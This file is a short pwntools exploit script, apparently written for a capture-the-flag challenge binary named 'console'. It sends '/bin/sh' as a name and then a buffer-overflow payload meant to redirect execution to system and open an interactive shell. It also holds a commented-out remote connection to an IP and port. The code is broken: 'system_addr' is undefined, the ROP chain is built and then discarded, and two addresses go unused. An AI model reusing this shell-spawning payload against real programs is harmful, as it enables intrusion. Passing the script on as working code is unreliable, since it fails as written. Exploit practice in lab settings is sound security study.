#!/usr/bin/python3
import pwn
e = pwn.context.binary = pwn.ELF("./console")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
   # +"\nbreak *0x004040b0"
    +"\nc"
)
sys_return = 0x4040b0
pop_rdi = 0x401473
#p = pwn.connect("94.237.53.58","50531")



p.sendlineafter('>>', 'hof')
p.sendlineafter('name:','/bin/sh')

payload = pwn.flat(
        {pwn.offset: [
            pop_rdi,
            system_addr,
            system_addr
            ]}
        )
payload=b"A"*24+ pwn.p64(system_addr)
p.sendlineafter('>>','flag')
p.sendlineafter('flag:', payload)
p.interactive()
